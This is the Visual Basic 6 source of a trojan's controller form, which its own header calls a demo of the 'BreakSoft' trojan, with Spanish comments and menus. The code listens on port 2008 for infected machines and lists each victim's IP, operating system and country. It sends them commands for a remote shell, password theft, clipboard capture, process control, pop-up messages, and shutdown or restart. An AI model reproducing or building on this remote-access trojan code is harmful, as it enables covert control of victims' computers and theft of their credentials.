VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F5E116E1-0563-11D8-AA80-000B6A0D10CB}#1.0#0"; "HookMenu.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   5265
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   9855
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5265
   ScaleWidth      =   9855
   StartUpPosition =   2  'CenterScreen
   Begin HookMenu.XpMenu XpMenu1 
      Left            =   3240
      Top             =   1800
      _ExtentX        =   900
      _ExtentY        =   900
      BmpCount        =   25
      CheckBorderColor=   7021576
      SelMenuBorder   =   7021576
      SelMenuBackColor=   14073525
      SelMenuForeColor=   0
      SelCheckBackColor=   14791828
      MenuBorderColor =   6956042
      SeparatorColor  =   -2147483632
      MenuBackColor   =   14609903
      MenuForeColor   =   0
      CheckBackColor  =   15326939
      CheckForeColor  =   65280
      DisabledMenuBorderColor=   -2147483632
      DisabledMenuBackColor=   15660791
      DisabledMenuForeColor=   -2147483631
      MenuBarBackColor=   15790320
      MenuPopupBackColor=   16777215
      ShortCutNormalColor=   0
      ShortCutSelectColor=   0
      ArrowNormalColor=   65280
      ArrowSelectColor=   12484864
      ShadowColor     =   0
      Bmp:1           =   "Form1.frx":3040A
      Key:1           =   "#info"
      Bmp:2           =   "Form1.frx":30832
      Mask:2          =   13228507
      Key:2           =   "#server"
      Bmp:3           =   "Form1.frx":30B84
      Key:3           =   "#ping"
      Bmp:4           =   "Form1.frx":30FAC
      Mask:4          =   16777215
      Key:4           =   "#editid"
      Bmp:5           =   "Form1.frx":312FE
      Key:5           =   "#reconectar"
      Bmp:6           =   "Form1.frx":31726
      Key:6           =   "#cerrar"
      Bmp:7           =   "Form1.frx":31B4E
      Key:7           =   "#refrescar"
      Bmp:8           =   "Form1.frx":31F76
      Key:8           =   "#manager"
      Bmp:9           =   "Form1.frx":3239E
      Mask:9          =   14215660
      Key:9           =   "#process"
      Bmp:10          =   "Form1.frx":326F0
      Key:10          =   "#msnmanager"
      Bmp:11          =   "Form1.frx":32B18
      Key:11          =   "#clipboardmanager"
      Bmp:12          =   "Form1.frx":32F40
      Key:12          =   "#printmanager"
      Bmp:13          =   "Form1.frx":33368
      Key:13          =   "#power"
      Bmp:14          =   "Form1.frx":33790
      Key:14          =   "#apagar"
      Bmp:15          =   "Form1.frx":33BB8
      Key:15          =   "#reiniciar"
      Bmp:16          =   "Form1.frx":33FE0
      Key:16          =   "#suspender"
      Bmp:17          =   "Form1.frx":34408
      Key:17          =   "#applauncher"
      Bmp:18          =   "Form1.frx":34830
      Key:18          =   "#password"
      Bmp:19          =   "Form1.frx":34C58
      Key:19          =   "#internetcontrol"
      Bmp:20          =   "Form1.frx":35080
      Key:20          =   "#opcionesdeinternet"
      Bmp:21          =   "Form1.frx":354A8
      Key:21          =   "#scannerdepuertos"
      Bmp:22          =   "Form1.frx":358D0
      Key:22          =   "#script"
      Bmp:23          =   "Form1.frx":35CF8
      Key:23          =   "#chat"
      Bmp:24          =   "Form1.frx":36120
      Key:24          =   "#enviarmensajes"
      Bmp:25          =   "Form1.frx":36548
      Key:25          =   "#remoteshell"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   4320
      Top             =   1800
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   1
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":36970
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3840
      Top             =   1800
   End
   Begin MSComctlLib.ListView LV 
      Height          =   5175
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   9855
      _ExtentX        =   17383
      _ExtentY        =   9128
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   6
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Nombre"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "IP"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "S.O"
         Object.Width           =   4410
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "RAM"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Pais"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Version"
         Object.Width           =   2540
      EndProperty
   End
   Begin MSWinsockLib.Winsock WS 
      Index           =   0
      Left            =   360
      Top             =   5400
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Menu menu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu info 
         Caption         =   "Información"
      End
      Begin VB.Menu server 
         Caption         =   "Server"
         Begin VB.Menu ping 
            Caption         =   "Ping"
         End
         Begin VB.Menu editid 
            Caption         =   "Edit ID"
         End
         Begin VB.Menu reconectar 
            Caption         =   "Reconectar"
         End
         Begin VB.Menu cerrar 
            Caption         =   "Cerrar"
         End
      End
      Begin VB.Menu refrescar 
         Caption         =   "Refrescar"
      End
      Begin VB.Menu manager 
         Caption         =   "Manager"
         Begin VB.Menu process 
            Caption         =   "Process Manager"
         End
         Begin VB.Menu msnmanager 
            Caption         =   "MSN Manager"
         End
         Begin VB.Menu clipboardmanager 
            Caption         =   "Clipboard manager"
         End
         Begin VB.Menu printmanager 
            Caption         =   "Print Manager"
         End
         Begin VB.Menu power 
            Caption         =   "Power Manager"
            Begin VB.Menu apagar 
               Caption         =   "Apagar"
            End
            Begin VB.Menu reiniciar 
               Caption         =   "Reiniciar"
            End
            Begin VB.Menu suspender 
               Caption         =   "Suspender"
            End
         End
         Begin VB.Menu applauncher 
            Caption         =   "App Launcher"
         End
      End
      Begin VB.Menu password 
         Caption         =   "Password"
      End
      Begin VB.Menu internetcontrol 
         Caption         =   "Internet Control"
         Begin VB.Menu opcionesdeinternet 
            Caption         =   "Opciones de Internet"
         End
         Begin VB.Menu scannerdepuertos 
            Caption         =   "Scanner de Puertos "
         End
      End
      Begin VB.Menu script 
         Caption         =   "Scripts"
      End
      Begin VB.Menu chat 
         Caption         =   "Chat"
      End
      Begin VB.Menu enviarmensajes 
         Caption         =   "Enviar Mensajes"
      End
      Begin VB.Menu remoteshell 
         Caption         =   "Remote Shell"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'#########################################################
' Nombre : DEMO BREAKSOFT
' Características : Administrador Remoto
' Clases Utilizadas : ---
' Modulos : PIPES & DECODE NO-IP & OTROS
' Medios : Base del Troyano creada por !Erick!
' Autor : C@$P€® más bien llamado Skyweb07
' Esto es un Demo del futuro troyano BreakSoft el cual fue diseñado para administrar remotamente archivos y otras muchas cosas más..
' Todo el codigo exepto Lo mencionado arriba a sido programado por C@$P€®
'##########################################################


Public total As Integer
Public TotalIndex As Integer
Dim vIndex As Variant

Private Sub apagar_Click()
enviar "ApagarSistema"
End Sub

Private Sub applauncher_Click()
app.Show
Me.Hide
End Sub

Private Sub cerrar_Click()
enviar "cerrar|"
End Sub

Private Sub chat_Click()
enviar "chat|"
chats.Show
Me.Hide
End Sub

Private Sub clipboardmanager_Click()
clip.Show
Me.Hide
End Sub



Private Sub editid_Click()
LV.StartLabelEdit
End Sub

Private Sub enviarmensajes_Click()
msg.Show
Me.Hide
End Sub

Private Sub Form_Load()
WS(0).LocalPort = 2008
WS(0).Listen
total = 0
alert
End Sub



Private Sub Form_Unload(Cancel As Integer)
Kill "alert.wav"
End Sub

Private Sub info_Click()
Form2.Show
enviar "sysinfo|"
Me.Hide
End Sub



Private Sub msnmanager_Click()
msns.Show
Me.Hide
End Sub

Private Sub opcionesdeinternet_Click()
internetopcions.Show
Me.Hide
End Sub

Private Sub password_Click()
pass.Show
Me.Hide
End Sub

Private Sub ping_Click()
pings.Show
Me.Hide
End Sub

Private Sub printmanager_Click()
impresora.Show
Me.Hide
End Sub

Private Sub process_Click()
procesos.Show
enviar "procesos|"
Me.Hide

End Sub

Private Sub reconectar_Click()
enviar "reconectar"
MsgBox "Servidor reiniciado correctamente", vbInformation, "Información"
End Sub

Private Sub refrescar_Click()
LV.Refresh
End Sub

Private Sub reiniciar_Click()
enviar "ReiniciarSistema"
End Sub

Private Sub remoteshell_Click()
cmd.Show
enviar "shell|"
Me.Hide
End Sub

Private Sub scannerdepuertos_Click()
puertos.Show
Me.Hide
End Sub

Private Sub script_Click()
ScriptManager.Show
Me.Hide
End Sub

Private Sub suspender_Click()
enviar "SuspenderSistema"
End Sub

Private Sub Timer1_Timer()
Dim vIndex As Variant
Dim v As Long
On Error Resume Next
For v = 0 To LV.ListItems.Count

vIndex = Split(LV.ListItems(v).Key, "|")
If WS(vIndex(0)).State <> 7 Then
LV.ListItems.Remove (v)
End If
Next
Me.Caption = "BioNet - " & LV.ListItems.Count & " conectado(s)" & "    " & Time
End Sub
Private Sub WS_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error Resume Next
TotalIndex = TotalIndex + 1
WS(Index).Close
WS(Index).Accept requestID
Load WS(TotalIndex)
WS(TotalIndex).Listen
End Sub
Private Sub LV_Mousedown(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If LV.SelectedItem.Selected = False Then
Exit Sub
ElseIf Button = 2 Then
PopupMenu Menu
End If
End Sub

Private Sub WS_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim datos As String
Dim pr
WS(Index).GetData datos
Data = Split(datos, "|")
Select Case Data(0)
Case "Conexion"

'Aqui empiezan los Case


'###########################################################################################################
'CONEXIÓN

Case "Conecta"
Dim X As ListItem
Set X = LV.ListItems.Add(, Index & "|", Data(1), 1, 1)
X.SubItems(1) = WS(Index).RemoteHostIP
X.SubItems(2) = Data(2)
X.SubItems(3) = Data(3) & " MB"
X.SubItems(4) = Data(4)
X.SubItems(5) = "V1.0"
notificacion.Visible = True
notificacion.Timer1.Enabled = True

'###########################################################################################################
'INFORMACION

Case "infor"
Form2.ListView1.ListItems(9).SubItems(1) = Data(5)
Form2.ListView1.ListItems(9).SubItems(1) = Data(1)
Form2.ListView1.ListItems(16).SubItems(1) = Data(2)
Form2.ListView1.ListItems(17).SubItems(1) = Data(3)
Form2.ListView1.ListItems(13).SubItems(1) = Data(4)
Form2.ListView1.ListItems(4).SubItems(1) = Data(5)
Form2.ListView1.ListItems(14).SubItems(1) = Data(6)
Form2.ListView1.ListItems(6).SubItems(1) = Data(7)
Form2.ListView1.ListItems(7).SubItems(1) = Data(8)
Form2.ListView1.ListItems(11).SubItems(1) = Data(9)
Form2.ListView1.ListItems(8).SubItems(1) = Data(10)
Form2.ListView1.ListItems(15).SubItems(1) = Data(6) & "\system32"
If Data(12) = "" Then
Form2.ListView1.ListItems(17).SubItems(1) = "Not Found!"
Else
Form2.ListView1.ListItems(17).SubItems(1) = Data(12)
End If

'###########################################################################################################
'CLIPBOARD

Case "/CLIPBOAR/"
clip.Text10.Text = clip.Text10.Text + textboard

Case "cliptext":
clip.Text10.Text = Data(1)


'############################################################################################################
'PASSWORDS

Case "noip"
pass.ListView1.ListItems.Clear
Dim T As ListItem
Set T = pass.ListView1.ListItems.Add(, , Data(1), 1, 1)
T.ListSubItems.Add , , Data(2)

'############################################################################################################
'DATOS DEL CHAT

Case "men"
chats.Text1.Text = Data(1)
Case "cierra"
chats.Text1.Text = chats.Text1.Text + vbNewLine + vbNewLine + "*******!!!!Fin de la conversación!!!!*******"

'###########################################################################################################
'PROCESOS

Case "proc"
Dim ñ As Long
For ñ = 1 To UBound(Data)
If Not (Data(ñ)) = "" Then
procesos.ListView1.ListItems.Add , , Data(ñ), 1, 1
End If
Next ñ

'###########################################################################################################
'SHELL

Case "NOMBREshell"
cmd.names = Data(1)
Case "sat"
cmd.Text3.Text = Data(1)
Case "no"
cmd.Text1.Text = cmd.Text1.Text & vbCrLf & Data(1)
Case "Fin"

'############################################################################################################
'MSGS

Case "mmbody":
    enviar "mmbodie|" & msg.envio.Text
Case "mmbuttons":
    If msg.Option1.Value = True Then enviar "mmbuttons|" & "critical"
    If msg.Option2.Value = True Then enviar "mmbuttons|" & "excla"
    If msg.Option3.Value = True Then enviar "mmbuttons|" & "info"
    If msg.Option4.Value = True Then enviar "mmbuttons|" & "question"
    If msg.Option5.Value = True Then enviar "mmbuttons|" & "none"


End Select
End Sub


Private Sub lv_AfterLabelEdit(Cancel As Integer, NewString As String)
enviar "nombrecan|" & NewString
End Sub

Sub alert()
Dim active() As Byte
active = LoadResData(2, "CUSTOM")
Open "alert.wav" For Binary As #1
Put 1, 1, active
Close #1
End Sub


